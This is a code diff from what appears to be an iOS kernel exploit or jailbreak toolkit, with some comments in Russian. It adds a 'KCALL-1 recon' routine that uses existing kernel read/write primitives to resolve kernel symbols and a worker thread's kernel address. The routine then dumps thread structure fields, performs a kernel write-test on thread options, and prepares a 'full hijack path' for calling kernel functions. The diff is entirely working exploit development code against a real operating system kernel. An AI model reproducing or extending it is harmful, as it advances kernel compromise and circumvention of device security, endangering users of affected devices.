@@ -3652,6 +3652,74 @@ static void *kpKcParkWorker(void *arg)
 + (NSString *)kcallTestReport
 {
     NSMutableString *r = [NSMutableString string];
+    void (^bc)(NSString *) = ^(NSString *s) {
+        kpNote(r, s);
+        extern void KPLogDirect(const char *);
+        KPLogDirect([[s stringByAppendingString:@"\n"] UTF8String]);
+    };
+    bc(@"=== KCALL-1 recon (NO set_state) ===");
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        bc(@"FAIL: KRW"); return r;
+    }
+    bc(@"  is_table…");
+    if (![self rcIsTableWithLog:r]) { bc(@"FAIL: is_table"); return r; }
+    bc(@"  is_table ok");
+
+    // Resolve target (safe, just a symbol).
+    uint64_t target = ksymbol(mach_kobj_count);
+    bc([NSString stringWithFormat:@"  mach_kobj_count=%#llx", (unsigned long long)target]);
+
+    // Park thread + resolve only. No exception ports, no set_state.
+    gKcStop = 0;
+    pthread_t wpt;
+    if (pthread_create(&wpt, NULL, kpKcParkWorker, NULL) != 0) {
+        bc(@"FAIL: pthread_create"); return r;
+    }
+    usleep(30000);
+    mach_port_t wport = pthread_mach_thread_np(wpt);
+    bc([NSString stringWithFormat:@"  worker port=%#x", wport]);
+    uint64_t threadVA = [self rcResolveThreadKVA:wport];
+    bc([NSString stringWithFormat:@"  thread_t=%#llx", (unsigned long long)threadVA]);
+    if (!threadVA) {
+        gKcStop = 1; pthread_detach(wpt);
+        bc(@"FAIL: thread_t resolve=0 — не трогаем ничего дальше");
+        [r appendFormat:@"\n[VERIFY] KCALL=0 PHASE=1 RESOLVE=0\n"];
+        return r;
+    }
+
+    // Dump a few thread fields (read-only).
+    uint64_t qC0 = early_kread64(threadVA + 0xC0);
+    uint64_t q100 = early_kread64(threadVA + 0x100);
+    uint64_t q140 = early_kread64(threadVA + 0x140);
+    uint64_t q180 = early_kread64(threadVA + 0x180);
+    uint64_t q3E8 = early_kread64(threadVA + 0x3E8);
+    bc([NSString stringWithFormat:@"  +C0=%#llx +100=%#llx +140=%#llx +180=%#llx +3E8=%#llx",
+        (unsigned long long)qC0, (unsigned long long)q100, (unsigned long long)q140,
+        (unsigned long long)q180, (unsigned long long)q3E8]);
+
+    // Identity write-test on options (restore immediately).
+    extern uint16_t kp_rc_kread16(uint64_t);
+    extern void kp_rc_kwrite16(uint64_t, uint16_t);
+    uint16_t opt0 = kp_rc_kread16(threadVA + 0xC0);
+    kp_rc_kwrite16(threadVA + 0xC0, (uint16_t)(opt0 | 0x8000));
+    uint16_t opt1 = kp_rc_kread16(threadVA + 0xC0);
+    kp_rc_kwrite16(threadVA + 0xC0, opt0);
+    uint16_t opt2 = kp_rc_kread16(threadVA + 0xC0);
+    bc([NSString stringWithFormat:@"  options 0xC0: %04x → %04x → restore %04x %@",
+        opt0, opt1, opt2, (opt2 == opt0) ? @"OK" : @"NESTED"]);
+
+    gKcStop = 1;
+    pthread_detach(wpt);
+    bc(@"=== KCALL-1 recon done (set_state NOT called) ===");
+    [r appendFormat:@"\n[VERIFY] KCALL=0 PHASE=1 RESOLVE=1 THREAD=%#llx OPT_OK=%d\n",
+     (unsigned long long)threadVA, opt2 == opt0 ? 1 : 0];
+    return r;
+}
+
+// Full hijack path (set_state + exception) — enabled after recon passes.
++ (NSString *)kcallTestReportFull
+{
+    NSMutableString *r = [NSMutableString string];
     [r appendString:@"\n=== KCALL test: TH_IN_MACH_EXCEPTION + mach_kobj_count ===\n"];
     if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
         [r appendString:@"KRW не жив.\n"]; return r;
